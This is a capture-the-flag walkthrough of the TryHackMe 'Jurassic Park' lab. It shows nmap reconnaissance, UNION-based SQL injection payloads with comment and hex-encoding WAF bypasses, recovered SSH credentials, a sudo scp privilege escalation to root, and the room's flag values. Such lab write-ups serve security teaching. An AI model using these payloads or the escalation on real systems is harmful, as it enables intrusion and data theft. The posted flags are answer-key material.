# Jurassic Park

![TryHackMe](https://img.shields.io/badge/TryHackMe-Room-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Privilege%20Escalation-blue)

> 🦖 Practical beginner-friendly room covering **Reconnaissance**, **SQL Injection**, **Enumeration**, and **Privilege Escalation**

---

## 📋 Introduction

Jurassic Park is a practical TryHackMe room focused on common penetration testing concepts such as:

- Reconnaissance  
- SQL Injection  
- Local Enumeration  
- Privilege Escalation  

The room provides a realistic beginner-friendly scenario where weak web security and Linux misconfigurations can be chained together to fully compromise the target system.

---

## 🗺️ Reconnaissance

The first step was identifying exposed services on the machine using **Nmap**.

```bash
nmap -sV -p- TARGET_IP
Open Ports
Port	Service
22	SSH
80	HTTP
🌐 Web Enumeration

Since a web server was available, the website became the main target.

Vulnerable Endpoint
item.php?id=2

A numeric parameter often indicates backend SQL queries.

💉 SQL Injection Discovery

Used ORDER BY testing to determine the number of columns.

?id=2 ORDER BY 1--
?id=2 ORDER BY 2--
?id=2 ORDER BY 3--
?id=2 ORDER BY 4--
?id=2 ORDER BY 5--
?id=2 ORDER BY 6--
Result

Error on column 6, meaning the query had 5 columns.

🧠 Database Enumeration
?id=2 UNION SELECT 1,database(),3,4,5--

Returned:

park
?id=2 UNION SELECT 1,version(),3,4,5--

Returned:

Ubuntu 16.04
🛡️ WAF Bypass

Blocked payloads were bypassed using:

Inline SQL comments instead of spaces
Hexadecimal encoded strings

Example:

users = 0x7573657273
🔑 Credential Extraction

Recovered credentials:

Username: dennis
Password: ih8dinos
💻 Initial Access

Used SSH to log in:

ssh dennis@TARGET_IP
📂 Local Enumeration

Flags were found through:

Home directory files
.viminfo
.bash_history
🚀 Privilege Escalation

Checking sudo permissions:

sudo -l

Result:

(ALL) NOPASSWD: /usr/bin/scp

This allowed reading files as root.

👑 Root Flag
sudo scp /root/flag5.txt /tmp/flag5.txt
cat /tmp/flag5.txt
🏁 Recovered Flags
Flag 1: b89f2d69c56b9981ac92dd267f
Flag 2: 96ccd6b429be8c9a4b501c7a0b117b0a
Flag 3: b4973bbc9053807856ec815db25fb3f1
Flag 5: 2a7074e491fcacc7eeba97808dc5e2ec
📌 Conclusion

This room was a great example of how:

SQL Injection → Credential Theft
SSH Access → Local Enumeration
Misconfigured sudo → Root Access

A complete attack chain from small mistakes. 🦖💀
